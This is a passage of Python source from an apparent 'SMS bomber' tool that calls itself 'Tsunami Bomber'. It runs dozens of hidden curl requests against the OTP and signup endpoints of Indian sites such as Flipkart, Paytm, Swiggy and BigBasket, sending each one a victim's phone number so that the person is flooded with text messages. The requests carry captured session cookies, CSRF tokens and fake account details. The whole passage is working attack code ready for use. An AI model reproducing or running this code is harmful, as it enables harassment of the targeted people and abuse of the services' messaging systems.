AMCV_17EB401053DAF4840A490D4C%40AdobeOrg=-227196251%7CMCIDTS%7C18527%7CMCMID%7C76403100668224989248663375062116515669%7CMCAAMLH-1601316203%7C12%7CMCAAMB-1601316203%7C6G1ynYcLPuiQxYZrsz_pkqfLG9yMXBpb2zX5dvJdYQJzPXImdj0y%7CMCOPTOUT-1600718605s%7CNONE%7CMCAID%7CNONE; s_cc=true; S=d1t14P0w/Pz8/Pz8/P3MSPyJaPxDnS+xX3DDqgNzmvw1zqm7YyImq0FXfp+hM4pKH58SFBsLxvXQ+P8Cz8lO4CyVM5w==; SN=VI40F03BF14E7C4B628CD08259542FE831.TOKC0B6874C268A424DB5DCA004325C0C2F.1600711730.LO; gpv_pn=LOGIN_V4_MOBILE; gpv_pn_t=dynamic; s_sq=flipkart-mob-web%3D%2526pid%253DLOGIN_V4_MOBILE%2526pidt%253D1%2526oid%253Dfunctiongr%252528%252529%25257B%25257D%2526oidt%253D2%2526ot%253DSUBMIT" -d '{"actionRequestContext":{"type":"LOGIN_IDENTITY_VERIFY","loginIdPrefix":"+91","loginId":"''' 
                + target +
                '''","clientQueryParamMap":{"ret":"/?affid=siteplug&affExtParam1=e2f29ff2e3dd9e65eb9e419d30dc8135","entryPage":"HOMEPAGE_HEADER_ACCOUNT"},"loginType":"MOBILE","verificationType":"OTP","screenName":"LOGIN_V4_MOBILE","sourceContext":"DEFAULT"}}' "https://1.rome.api.flipkart.com/1/action/view" --output Logfile > /dev/null 2>&1  
                            ''')
            times = times + 1
        except Exception as A:
            print("#30",A)
        try:
            os.popen(
                '''
                            curl -X GET -H "Host:img1a.flixcart.com" -H "Connection:keep-alive" -H "User-Agent:Mozilla/5.0 (Linux; U; Android 8.1.0; en-us; CPH1909 Build/O11019) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/53.0.2785.134 Mobile Safari/537.36 OppoBrowser/2.2.5" -H "Accept:*/*" -H "Referer:https://www.flipkart.com/login/verify?type=mobile&verificationType=otp&loginIdentifier=''' 
                + target +
                '''&loginIdentifierPrefix=%2B91&sourceContext=default&ret=%2F%3Faffid%3Dsiteplug%26affExtParam1%3De2f29ff2e3dd9e65eb9e419d30dc8135&entryPage=HOMEPAGE_HEADER_ACCOUNT&supportedAuthenticationTypes=password&churned=false" -H "Accept-Encoding:gzip, deflate" -H "Accept-Language:en-US" "https://img1a.flixcart.com/batman-returns/batman-returns/p/images/logo_lite-cbb357.png" --output Logfile > /dev/null 2>&1 
                            ''')
            times = times + 1
        except Exception as A:
            print("#31",A)
        try:
            os.popen('''
                            curl -X POST -H "Host:ullu.app" -H "content-length:0" -H "accept:application/json, text/plain, */*" -H "origin:https://ullu.app" -H "user-agent:Mozilla/5.0 (Linux; U; Android 8.1.0; en-us; CPH1909 Build/O11019) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/53.0.2785.134 Mobile Safari/537.36 OppoBrowser/2.2.5" -H "referer:https://ullu.app/" -H "accept-encoding:gzip, deflate" -H "accept-language:en-US" -H "cookie:_fbp=fb.1.1600715934726.1447032121" -H "cookie:__stripe_sid=5807554c-54bc-45e8-a9c9-29ed36e779f298c41e" -H "cookie:__stripe_mid=61958e5d-6e35-476d-8b25-35de8dc0e55bcd3559" -H "cookie:G_ENABLED_IDPS=google" -H "cookie:_gat_gtag_UA_126575807_1=1" -H "cookie:_gid=GA1.2.1612551927.1600715932" -H "cookie:_ga=GA1.2.1941258238.1600715932" -d '' "https://ullu.app/ulluCore/api/v1/otp/sendRegisterOTP?mobileNumber='''
                     + target + '''"  > /dev/null 2>&1
                            ''')
            times = times + 1
        except Exception as A:
            print("#32",A)
        try:
            os.popen(
                '''
                            curl -X POST -H "Host:accounts.paytm.com" -H "Connection:keep-alive" -H "Content-Length:286" -H "Accept:application/json, text/plain, */*" -H "Origin:https://accounts.paytm.com" -H "User-Agent:Mozilla/5.0 (Linux; U; Android 8.1.0; en-us; CPH1909 Build/O11019) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/53.0.2785.134 Mobile Safari/537.36 OppoBrowser/2.2.5" -H "Content-Type:application/json" -H "Referer:https://accounts.paytm.com/oauth2/authorize?theme=mp-html5&redirect_uri=https%3A%2F%2Fpaytm.com%2Fv1%2Fapi%2Fauthresponse&is_verification_excluded=false&client_id=paytm-web-secure&type=web_server&scope=paytm&response_type=code" -H "Accept-Encoding:gzip, deflate" -H "Accept-Language:en-US" -H "Cookie:bm_sz=C3DEDDABBCB6E76563706756F75C11A7~YAAQBI0sMQ9J0rF0AQAAGNwhsgl73OX8RyMOLhj4W4LXhRtHX9U2K/AmO1VYDUmLW4gKfOdtR6XWEvHUYoU5UgAAQvJTf6Sb3UmpjG/PLkwpri7ZHjCfMjgxXPOzqIRU/gLju9kAH/6dZZHPqy+tMFHhwx62ajcy3Ga1X0zO8Jjnp3Wxy2hK/7HgIEOI1CM=; bm_mi=540981F9F36D1544FEC97D099B53B53D~p9uVoaZIXMR5xK6k5lSZoJ/3FerRdOYvIPl3Hn6tTBoGwEWGZR4jeCKPVbtwXVlGmFHvYY1G6wP+yQDVir7OWEiF6RTg+3WjZ+h8KHg99TpIiJi1ELxBbguW7K0wNAjN5VCLGt1iv/pQ49j9HFjqvjKe9FHmY2NlmCFBLJSIT9el5s6QFmKkKGIT8mdtyhYqax1l6+LumeKZ3VsYeaIwv/6qYy0u9SWYHZpGh8guJDzPKM4s+dhSMTgdm3UEC4KBG51HKVHzPDlsM4fL5+e6GWyM0gkk4DqNJIcCnTwlRCU=; ak_bmsc=F8EAD94DECE07AE1EFE40A9582B5CF2D312C8D04FD5C00006DFE685F77272D3B~plcGUGZxShuIGFCeOpP68aJwg4G4r/YvFYehnveWSNhVfiGee+U1CtEXU9456Id8di6ewHICFCeUqW8BtrM3De/1nkvdeDht3qvcnG7IGkECYuMTRfK0Jhnvq+P+AVzphXerowqtTahsCY8ftXm4nUJG6n7ivFRBPNg9Xivi3rJp/aUE9fRdFtjhpDDD6201sRJnAKI7EKgBc9oTc+pW6Wfi2qW6b0tOgdDtEpGN90Ndfoll3whyTScdjCnQgeXCJC; _abck=45A4857E6B593E42F78976A08356DD9F~0~YAAQBI0sMddJ0rF0AQAA6O4hsgQPQwGVxJ7H6HN5HdNhBLY3VAskkFvejjgx6FJ/4r760cOUSDmU20pVbrc5F7utD7+WHcMoE9XXkM94FULZ64FbH4b/FJQRa7C0tMpZZvGGhhEmD7hmbpeYm/+DSi0aYcnkoD/VUQxVrPRVC9ayrUw++SusmU0pYuxAaHvlgo7+yw7cIdgebFyTTnRMDW/rNXC6FIZb5Iq7vIRIH4WAdd9C6EcL0tYmktTXaRK52+c0XfrpjtfjAfYVeq8YUWILROIOTUp3VBOYt23O5KnuFqpdjpROswkNKNCBJrLDwf/3A2dH~-1~||-1||~-1; returning_usr=1; bm_sv=DA28E6771684381F7602D33009AD7A67~cDaMe2LqH5njmD8wD8YJSs3oXzmH2Dd+n088p+XrJ5zVS+oDLveaBbMu9cIqQh31CGrdQ03246dyOUebPadurlP2lI3SMSTM7gwc/qHpzEJqxsgFYE3JmF1u8UJpEX5nAAQUtbG4gPS0nvQhx9ebVmw2Yx3+1ZIRMVJPOfAT89U=" -d '{"email":"","mobile":"'''
                + target +
                '''","loginPassword":"Pura@1090","csrfToken":"f7ea628c-91a2-5f14-82ca-6f7eee295b1d","redirectUri":"https://paytm.com/v1/api/authresponse","clientId":"paytm-web-secure","scope":"paytm","state":"","responseType":"code","theme":"mp-html5","dob_agreement":true}' "https://accounts.paytm.com/v2/api/register"  > /dev/null 2>&1
                            ''')
            times = times + 1
        except Exception as A:
            print("#33",A)
        try:
            os.popen('''
                            curl -X POST -H "Host:ogonn.in" -H "content-length:65" -H "accept:application/json, text/javascript, */*; q=0.01" -H "origin:https://ogonn.in" -H "x-requested-with:XMLHttpRequest" -H "user-agent:Mozilla/5.0 (Linux; U; Android 8.1.0; en-us; CPH1909 Build/O11019) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/53.0.2785.134 Mobile Safari/537.36 OppoBrowser/2.2.5" -H "content-type:application/x-www-form-urlencoded; charset=UTF-8" -H "referer:https://ogonn.in/login" -H "accept-encoding:gzip, deflate" -H "accept-language:en-US" -H "cookie:laravel_session=eyJpdiI6Ik9UWFwvZzlxdEozVk5ITmZGYnhQM1F3PT0iLCJ2YWx1ZSI6IituT2hPUDd0eWFhdHI2RFNjRk9GXC91Vk9DOXRaV295TzFrc041ZnAwNjNuaEJSZkxaU0JzN2FvbXNxVzA1S2trIiwibWFjIjoiMTU4YjdmYzFkMzZiNTdkMjhjZDA3MGY2YjllNTcxMzMwODU3ZjQ5ZGY2NTcyMzE5ZDhlNWFlMjNhZjc3MWYyOCJ9" -H "cookie:XSRF-TOKEN=eyJpdiI6IkVWVEMrUW80TU1rc2U1R1pza1E2b1E9PSIsInZhbHVlIjoidWxPYUxYamtqaVh2QVFjNzlsVlZadHE2TG5VWlVPalwvN0xmTDJcLzFJSzBSaTFvSisxZmxnVmZrb20rdkQ5UkE3IiwibWFjIjoiOTZiZTA1MmM1ZTZhY2Q2NGNkYjAwOTBjZmUzMTJlNzNmNGVmMzgxYzU5ZmZhODc3ZmJkZWMwZmRjNjk4N2UxYSJ9" -H "cookie:_fbp=fb.1.1600717201907.1836998376" -d '_token=I10LMVWBAN1c30T8SbgVHHvlKFTgTU1iFTm7hlfl&mobile='''
                     + target +
                     '''' "https://ogonn.in/otp" --output Logfile > /dev/null 2>&1
                            ''')
            times = times + 1
        except Exception as A:
            print("#34",A)
        try:
            os.popen(
                '''
                            curl -X POST -H "Host:digital.aakash.ac.in" -H "content-length:30" -H "accept:*/*" -H "origin:https://digital.aakash.ac.in" -H "x-requested-with:XMLHttpRequest" -H "user-agent:Mozilla/5.0 (Linux; U; Android 8.1.0; en-us; CPH1909 Build/O11019) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/53.0.2785.134 Mobile Safari/537.36 OppoBrowser/2.2.5" -H "content-type:application/x-www-form-urlencoded; charset=UTF-8" -H "referer:https://digital.aakash.ac.in/online-courses?utm_source=Google_Search&utm_medium=Paid&utm_content=Online_Classes_GS&utm_campaign=Srch_Generic_GS_Exact_2020_Rxm&utm_term=online%20study%20courses&gclid=EAIaIQobChMIvouozor76wIVMcEWBR1y6QeAEAAYASAAEgKbQPD_BwE" -H "accept-encoding:gzip, deflate" -H "accept-language:en-US" -H "cookie:_co_session_active=1" -H "cookie:_gac_UA-132222061-1=1.1600720006.EAIaIQobChMIvouozor76wIVMcEWBR1y6QeAEAAYASAAEgKbQPD_BwE" -H "cookie:_gid=GA1.3.1265004790.1600719997" -H "cookie:_ga=GA1.3.1759859626.1600719997" -H "cookie:_fbp=fb.2.1600720004859.138019050" -H "cookie:_gat_UA-132222061-1=1" -H "cookie:_gac_UA-132222061-1=1.1600719997.EAIaIQobChMIvouozor76wIVMcEWBR1y6QeAEAAYASAAEgKbQPD_BwE" -H "cookie:_gid=GA1.4.1265004790.1600719997" -H "cookie:_ga=GA1.4.1759859626.1600719997" -H "cookie:AWSALB=72X09cOjNjRUWWCFBkPfC4pzIxNDaf7UOluGPLojxXMlbny21JQrAgsBxD2kPx47rLJscBQ4+YLSLds2TCR7ltut261umPg7FUh1IBCt4tCi8kjCQIzPem5vmWxd" -d '&mobileval='''
                + target +
                '''&otp=6230' "https://digital.aakash.ac.in/mkt-signup-otp-verify" --output Logfile  > /dev/null 2>&1
                            ''')
            times = times + 1
        except Exception as A:
            print("#35",A)
        try:
            os.popen(
                '''
                            curl -X POST -H "Host:www.swiggy.com" -H "content-length:172" -H "origin:https://www.swiggy.com" -H "__fetch_req__:true" -H "user-agent:Mozilla/5.0 (Linux; U; Android 8.1.0; en-us; CPH1909 Build/O11019) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/53.0.2785.134 Mobile Safari/537.36 OppoBrowser/2.2.5" -H "content-type:application/json" -H "accept:*/*" -H "referer:https://www.swiggy.com/auth/register" -H "accept-encoding:gzip, deflate" -H "accept-language:en-US" -H "cookie:_gid=GA1.2.1062400057.1600721785" -H "cookie:_ga=GA1.2.933128931.1600721785" -H "cookie:__cf_bm=49fd023d2de2dcc513416b86f346ef849ff78965-1600721801-1800-AffpoGFA9y2uIXnuTnsdWLAvACoa7Yoi0Atoa5go3TwGhcCaro5zMawagaz/3h6h+magOo4GhTCbVieffp6NXM0=" -H "cookie:_device_id=becf3981-4f8f-41e0-b3dd-3188b909ae13" -H "cookie:afUserId=e5d4b7d4-1473-4953-8dd8-7db0c6a7c614-p" -H "cookie:__cfduid=d4953510590027eff3cccf0ec29bd40121600721785" -H "cookie:AMP_TOKEN=%24NOT_FOUND" -H "cookie:_gcl_au=1.1.1262278937.1600721784" -H "cookie:_sid=p6q1ed4e-90a6-4c83-b56b-f1af071a0b17" -H "cookie:_guest_tid=ac1bb2e7-f54c-45cb-8a69-5ebd7b6706f5" -H "cookie:__SW=bcBBQ8mXgTrUPE0YKx8A44dDIVVH5UoB" -d '{"name":"dbdbdbd","email":"tsunami@gmail.com","password":"sndndndbdj283jsbsbs","referral_code":"","mobile":"'''
                + target +
                '''","_csrf":"jK7JY3E9u8xJ-1Q_DUwsGnPDhccbB4rGz0dKIbfk"}' "https://www.swiggy.com/mapi/auth/signup" --output Logfile  > /dev/null 2>&1
                            ''')
            times = times + 1
        except Exception as A:
            print("#36",A)
        try:
            os.popen(
                '''
                            curl -X POST -H "Host:www.limeroad.com" -H "content-length:101" -H "origin:https://www.limeroad.com" -H "user-agent:Mozilla/5.0 (Linux; U; Android 8.1.0; en-us; CPH1909 Build/O11019) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/53.0.2785.134 Mobile Safari/537.36 OppoBrowser/2.2.5" -H "content-type:application/x-www-form-urlencoded" -H "accept:*/*" -H "referer:https://www.limeroad.com/feed_nup_v1?feed_kyc=true&gender=Men" -H "accept-encoding:gzip, deflate" -H "accept-language:en-US" -H "cookie:locale=hi" -H "cookie:lrVr=v2" -H "cookie:AWSALB=Aum/5hkqPnGDduYS/RwPuH4NMlb8KsEWzmAcaduTtaaRrPdqiZ76xnnTdzuLPupgFMK3xXY3uJH4GgYj9V5wN9MLnEwGPNy2LdlaCycYQQSBcBOfEaMI5VsVlx3/" -H "cookie:testCookie=v2" -H "cookie:deviceHeight=632" -H "cookie:deviceWidth=360" -H "cookie:gender=M" -H "cookie:duid=e9e7b3ffb31375ea608dc18f9da4e98c" -H "cookie:_session_id=e2b24a146c5a10f5f7abf753786a12d9" -H "cookie:nH=1" -H "cookie:newCssOpt=v1" -H "cookie:_ruid=9a0ef1da-cd58-4e5e-a326-09c0e757be5a" -H "cookie:jr_token=true%3F%3F7b529cb3-c933-43cf-9ec1-360139c2d56e%3F%3Fjoulroad%3F%3F8fe37c95-270b-4a92-81f9-2a8d684cac66%3F%3FGuest" -H "cookie:a_n_u_a=1" -d 'utf8=%E2%9C%93&authenticity_token=6686Dtpby7plpvjXr5%2Fe8oyPdiQ3Weta9Y9ydzSRP64%3D&user_id='''
                + target +
                '''' "https://www.limeroad.com/auth/get_uuid_v2?ajax=true&ret=https://www.limeroad.com/myaccount/orders?ajax=true&mobileOnly=false&doAction=" --output Logfile > /dev/null 2>&1
                            ''')
            times = times + 1
        except Exception as A:
            print("#37",A)
        try:
            os.popen(
                '''
                            curl -X POST -H "Host:www.cilory.com" -H "content-length:23" -H "accept:application/json" -H "origin:https://www.cilory.com" -H "user-agent:Mozilla/5.0 (Linux; U; Android 8.1.0; en-us; CPH1909 Build/O11019) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/53.0.2785.134 Mobile Safari/537.36 OppoBrowser/2.2.5" -H "content-type:application/json;charset=UTF-8" -H "referer:https://www.cilory.com/authentication?back=%2Fmy-account" -H "accept-encoding:gzip, deflate" -H "accept-language:en-US" -H "cookie:2ceb3d353e9c50fe7a9dad32e9e13b2a=IlS0K5pquXDrkAGJ4KMhpPkViw5v6JpcBK%2Fo0kMH8Ac3xz8xhstQoj6kxqf98nqjdK6C3J1P%2FvinTLjgm6uYZUF1S0sA8eCOQ%2F4zan%2BdtjQ%3D123456" -H "cookie:_fbp=fb.1.1600749694805.191445483" -H "cookie:_gcl_aw=GCL.1600749692.EAIaIQobChMIkorHyvj76wIVVqWWCh1XDQ-UEAQYCSABEgJce_D_BwE" -H "cookie:_gat_gtag_UA_18030761_1=1" -H "cookie:_gac_UA-18030761-1=1.1600749692.EAIaIQobChMIkorHyvj76wIVVqWWCh1XDQ-UEAQYCSABEgJce_D_BwE" -H "cookie:_gid=GA1.2.468416282.1600749692" -H "cookie:_ga=GA1.2.2135791951.1600749692" -d '{"mobile":"'''
                + target +
                '''"}' "https://www.cilory.com/app/w/auth/soft"  > /dev/null 2>&1
                            ''')
            times = times + 1
        except Exception as A:
            print("#38",A)
        try:
            os.popen(
                '''
                            curl -X POST -H "Host:login.web.ajio.com" -H "Connection:keep-alive" -H "Content-Length:158" -H "accept:application/json" -H "Origin:https://www.ajio.com" -H "User-Agent:Mozilla/5.0 (Linux; U; Android 8.1.0; en-us; CPH1909 Build/O11019) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/53.0.2785.134 Mobile Safari/537.36 OppoBrowser/2.2.5" -H "content-type:application/json" -H "Referer:https://www.ajio.com/signup?referrer=/my-account/" -H "Accept-Encoding:gzip, deflate" -H "Accept-Language:en-US" -d '{"firstName":"Tsunami Bomber","login":"tsunami@gmail.com","password":"kd34646@3131nxnxn","genderType":"","mobileNumber":"'''
                + target + 
                '''","requestType":"SENDOTP"}' "https://login.web.ajio.com/api/auth/signupSendOTP" > /dev/null 2>&1 
                            ''')
            times = times + 1
        except Exception as A:
            print("#39",A)
        try:
            os.popen(
                '''
                            curl -X POST -H "Host:digital.aakash.ac.in" -H "content-length:21" -H "accept:*/*" -H "origin:https://digital.aakash.ac.in" -H "x-requested-with:XMLHttpRequest" -H "user-agent:Mozilla/5.0 (Linux; U; Android 8.1.0; en-us; CPH1909 Build/O11019) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/53.0.2785.134 Mobile Safari/537.36 OppoBrowser/2.2.5" -H "content-type:application/x-www-form-urlencoded; charset=UTF-8" -H "referer:https://digital.aakash.ac.in/user/register" -H "accept-encoding:gzip, deflate" -H "accept-language:en-US" -H "cookie:__zlcmid=10IjS9ldmuaIwof" -H "cookie:_co_session_active=1" -H "cookie:_gac_UA-132222061-1=1.1600720006.EAIaIQobChMIvouozor76wIVMcEWBR1y6QeAEAAYASAAEgKbQPD_BwE" -H "cookie:_gid=GA1.3.1265004790.1600719997" -H "cookie:_ga=GA1.3.1759859626.1600719997" -H "cookie:_fbp=fb.2.1600720004859.138019050" -H "cookie:_hjIncludedInSessionSample=1" -H "cookie:_gac_UA-132222061-1=1.1600720006.EAIaIQobChMIvouozor76wIVMcEWBR1y6QeAEAAYASAAEgKbQPD_BwE" -H "cookie:_gid=GA1.4.1265004790.1600719997" -H "cookie:_ga=GA1.4.1759859626.1600719997" -H "cookie:AWSALB=dc39iVQJB7z5bxbK+8AZ/kOwW29goA5mAejiW5ecDoRFe5kGjNfw2I7KdE72gvy0JdR+T98HU7sz/9SX2sS7zbjR5mfmkhdngzxHGshtH9XM94QFW5L0uL+aIzpf" -H "cookie:cto_bundle=wRx-il9KZ1ZVUFBBUEdtaDhUbExxZnBYcTJTOXZXd050Z0E3TnElMkZqNyUyRlZ3VGRZcGNuZjJJUDZ4MFlyZk9waTdsQjJLMUFtWDlpdG1XWG5iT1hZSU9VeGslMkJRQ21uJTJCaWplbW94cEZaaDZpZ3FMMnBKUmV3OFN4d1h6SVo3clQ1VjFQOEtQS2RLV2U0ajBPMnc1NnJyMUwlMkYxSkVnJTNEJTNE" -H "cookie:_uetvid=d753b1ed7dd67a59bebc401d8ab4515b" -H "cookie:_uetsid=946c3602e20e8980818f215fc8fac48f" -H "cookie:_gcl_au=1.1.2026770221.1600758975" -H "cookie:wh-widget-cookie=1" -H "cookie:_hjid=30609baa-1084-4a2e-998c-54e41f4084fd" -H "cookie:_hjTLDTest=1" -d '&mobileval='''
                + target +
                '''' "https://digital.aakash.ac.in/signup-otp-verify" --output Logfile  > /dev/null 2>&1
                            ''')
            times = times + 1
        except Exception as A:
            print("#40",A)
        try:
            os.popen(
                '''
                            curl -X POST -H "Host:in.bookmyshow.com" -H "content-length:108" -H "accept:application/json" -H "save-data:on" -H "user-agent:Mozilla/5.0 (Linux; Android 8.1.0; CPH1909) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.101 Mobile Safari/537.36" -H "content-type:application/json" -H "origin:https://in.bookmyshow.com" -H "sec-fetch-site:same-origin" -H "sec-fetch-mode:cors" -H "sec-fetch-dest:empty" -H "referer:https://in.bookmyshow.com/login/otp?referer=/my-profile&phoneNumber=9519874704&email=&source=web" -H "accept-encoding:gzip, deflate, br" -H "accept-language:en-US,en;q=0.9,hi;q=0.8" -H "cookie:G_ENABLED_IDPS=google" -H "cookie:__gads=ID=d26aff9d3d5b5940:T=1600760478:S=ALNI_MYNMzi7KJxqglyRDRdb3Nr2POPTCQ" -H "cookie:WZRK_S_RK4-47R-98KZ=%7B%22p%22%3A2%2C%22s%22%3A1600760468%2C%22t%22%3A1600760475%7D" -H "cookie:__cfruid=8e5d4c1f350ee79cb716173f1ffdbf6d93c83193-1600760464" -H "cookie:WZRK_G=0cf00ce388574ff6ba9d04426bc06a73" -H "cookie:_fbp=fb.1.1600760469186.748107165" -H "cookie:_gat_UA-27207583-8=1" -H "cookie:tvc_bmscookie_gid=GA1.2.385961487.1600760469" -H "cookie:tvc_bmscookie=GA1.2.791995216.1600760469" -H "cookie:AMP_TOKEN=%24NOT_FOUND" -H "cookie:rgn=%7B%22regionCode%22%3A%22FAZA%22%2C%22regionName%22%3A%22Faizabad%22%2C%22subCode%22%3A%22%22%2C%22subName%22%3A%22%22%2C%22regionNameSlug%22%3A%22faizabad%22%2C%22regionCodeSlug%22%3A%22faza%22%2C%22Lat%22%3A%2226.7732%22%2C%22Long%22%3A%2282.1442%22%7D" -H "cookie:overrideArea=%22true%22" -H "cookie:userNotified=false" -H "cookie:sessionId=1600760454038" -H "cookie:_gcl_au=1.1.1886680337.1600760453" -H "cookie:preferences=%7B%22ticketType%22%3A%22M-TICKET%22%7D" -H "cookie:bmsId=1.970754064.1600760445681" -H "cookie:__cfduid=d81aa31782d9363b10830a4a64d9b9ad71600760445" -d '{"channel":"phone","subChannel":"sms","details":{"phone":"'''
                + target +
                '''","origin":"https://in.bookmyshow.com"}}' "https://in.bookmyshow.com/pwa/api/uapi/otp/send"  > /dev/null 2>&1
                            ''')
            times = times + 1
        except Exception as A:
            print("#41",A)
        try:
            os.popen(
                '''
                            curl -X POST -H "Host:www.bigbasket.com" -H "content-length:27" -H "accept:application/json" -H "x-csrftoken:gHbsx6okji95qhYgKApxE9vPjHhYlpBkgVd73fh23WRxl9XfmikiznVB1Jy2X2ED" -H "save-data:on" -H "user-agent:Mozilla/5.0 (Linux; Android 8.1.0; CPH1909) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.101 Mobile Safari/537.36" -H "x-channel:BB-PWA" -H "content-type:application/json" -H "origin:https://www.bigbasket.com" -H "sec-fetch-site:same-origin" -H "sec-fetch-mode:cors" -H "sec-fetch-dest:empty" -H "referer:https://www.bigbasket.com/auth/login/" -H "accept-encoding:gzip, deflate, br" -H "accept-language:en-US,en;q=0.9,hi;q=0.8" -H "cookie:adb=0" -H "cookie:G_ENABLED_IDPS=google" -H "cookie:bigbasket.com=9431754c-9582-4b9f-b24b-532a320f74f7" -H "cookie:ts="2020-09-22 13:20:05.803"" -H "cookie:_fbp=fb.1.1600761006368.1940593604" -H "cookie:_gcl_au=1.1.1149181141.1600761003" -H "cookie:bb_home_cache=a85e99f3.431.visitor" -H "cookie:_bb_rd=1" -H "cookie:_bb_rdt="MzEzOTUwNDU2Ng==.1"" -H "cookie:_bb_aid="MzE5NTMyMDU0Nw=="" -H "cookie:_bb_tc=1" -H "cookie:sessionid=bjd52bw7pig7mpw92e621b4nmbjllpdg" -H "cookie:_bb_hid=454" -H "cookie:_client_version=2321" -H "cookie:data=%7B%22referrerInPageContext%22%3A%22backbtn%22%7D" -H "cookie:_gat_gtag_UA_27455376_1=1" -H "cookie:_gid=GA1.2.467547806.1600760997" -H "cookie:_ga=GA1.2.1059142911.1600760997" -H "cookie:bb_home_cache=a85e99f3.431.visitor" -H "cookie:csrftoken=gHbsx6okji95qhYgKApxE9vPjHhYlpBkgVd73fh23WRxl9XfmikiznVB1Jy2X2ED" -H "cookie:_bb_cid=27" -H "cookie:_bb_dsid=" -H "cookie:_bb_vid=MzgxMTEyNTc0OA==" -H "cookie:_bb_nhid=454" -H "cookie:_bb_loid=j:null" -H "cookie:PWA=1" -H "cookie:_bb_locSrc=akamai" -d '{"identifier":"'''
                + target +
                '''"}' "https://www.bigbasket.com/mapi/v4.0.0/member-svc/otp/send/"  > /dev/null 2>&1
                            ''')
            times = times + 1
        except Exception as A:
            print("#42",A)
        try:
            os.popen(
                '''
                            curl -X POST -H "Host:cod.flomattress.com" -H "Connection:keep-alive" -H "Content-Length:49" -H "Accept:application/json, text/javascript, */*; q=0.01" -H "Save-Data:on" -H "User-Agent:Mozilla/5.0 (Linux; Android 8.1.0; CPH1909) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.101 Mobile Safari/537.36" -H "Content-Type:application/x-www-form-urlencoded; charset=UTF-8" -H "Origin:https://www.flomattress.com" -H "Sec-Fetch-Site:same-site" -H "Sec-Fetch-Mode:cors" -H "Sec-Fetch-Dest:empty" -H "Referer:https://www.flomattress.com/account/register" -H "Accept-Encoding:gzip, deflate, br" -H "Accept-Language:en-US,en;q=0.9,hi;q=0.8" -d 'number='''
                + target +
                '''&store=hushbedding.myshopify.com' "https://cod.flomattress.com/api/otp" > /dev/null 2>&1
                            ''')
            times = times + 1
        except Exception as A:
            print("#43",A)
        try:
            os.popen(
                '''
                            curl -X POST -H "Host:m.banggood.in" -H "content-length:65" -H "accept:application/json" -H "x-requested-with:XMLHttpRequest" -H "save-data:on" -H "user-agent:Mozilla/5.0 (Linux; Android 8.1.0; CPH1909) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.101 Mobile Safari/537.36" -H "content-type:application/x-www-form-urlencoded" -H "origin:https://m.banggood.in" -H "sec-fetch-site:same-origin" -H "sec-fetch-mode:cors" -H "sec-fetch-dest:empty" -H "referer:https://m.banggood.in/login.html" -H "accept-encoding:gzip, deflate, br" -H "accept-language:en-US,en;q=0.9,hi;q=0.8" -H "cookie:akaas_WWW1ABTestS=1600784215~rv=86~id=142dea7c39dcdf1aa52b02a9edb65857" -H "cookie:_sctr=1|1600713000000" -H "cookie:cto_bundle=B7YX1V9xWSUyRldtWUJzY1VIWGlhOHphUDlBTiUyQjZFcUNVeG0zQkx5d3RRQ3owTjl6SWJPOXhrcDlEWnZYRU56VXV4RG4wS0M3TG51amtLclhqMzUxclpzR3lPVjdIQnVJWkJBJTJCRSUyQm9XQ1JZRUp1cWZkWGhOaHV1UmMya2RKcnZGSGFQQ3NDWFB6Y0YlMkZONExtJTJCeFUwS3NneU95TnclM0QlM0Q" -H "cookie:_pin_unauth=dWlkPVl6WXpNakF6TVRRdE0yUXpaaTAwTVRCa0xUZ3pNVE10TmpZNU5qTmhOMkZsTldZNSZycD1abUZzYzJV" -H "cookie:_fbp=fb.1.1600762304817.979546076" -H "cookie:_scid=930e7858-2b7d-47c6-a7b0-4306a8a4efa7" -H "cookie:_gat_gtag_UA_130998589_1=1" -H "cookie:_gat=1" -H "cookie:_uetvid=4faf4aa86abe62cd3ce3e8cb0e169210" -H "cookie:_uetsid=df92279395a7aff562f9f533491d5452" -H "cookie:rec_sid=3795718099|1600762296" -H "cookie:__bgvisit=1600762296137|admitad|aff|c91a7584326ca1bb44e73ab144f4861e|866755|0|2|null" -H "cookie:_bg_w_c=b7a49103f1e175e2914b67e6ddb19ad5" -H "cookie:installBGAPP=1" -H "cookie:_gid=GA1.2.1887335251.1600762290" -H "cookie:_ga=GA1.2.2008480368.1600762290" -H "cookie:SearchWare=WyJ1c2EiLCJ1ayIsImhrIiwiYXUiLCJmciIsImd3dHIiLCJlcyIsInJ1IiwiY3oiLCJhZSJd" -H "cookie:new_user=1" -H "cookie:_gcl_au=1.1.1822847057.1600762288" -H "cookie:__bgresource=affiliate" -H "cookie:rec_uid=1578453606|1600762285" -H "cookie:__bguser=1600762284904|1560641939780|1560641939780|1600762284904" -H "cookie:__bgqueue=1600762284904|admitad|aff|c91a7584326ca1bb44e73ab144f4861e|866755|0|2|0|" -H "cookie:__bgcookie=0|" -H "cookie:countryCookie=%7B%22code%22%3Anull%2C%22name%22%3Anull%2C%22currency%22%3A%22INR%22%2C%22zone_id%22%3A%22%22%2C%22zone_code%22%3A%22%22%2C%22zone_name%22%3A%22%22%7D" -H "cookie:currency=INR" -H "cookie:_bgLang=en-GB" -H "cookie:WebApp_SID=7f9e857355eff99028eb4e66c2d4e9d2" -d 'mobilePhone='''
                + target +
                '''&countryPhoneCode=91&type=1&verifyCode=KmUu' "https://m.banggood.in/index.php?com=login&t=sendMtSms&c=api" > /dev/null 2>&1
                            ''')
            times = times + 1
        except Exception as A:
            print("#44",A)
        try:
            os.popen(
                '''
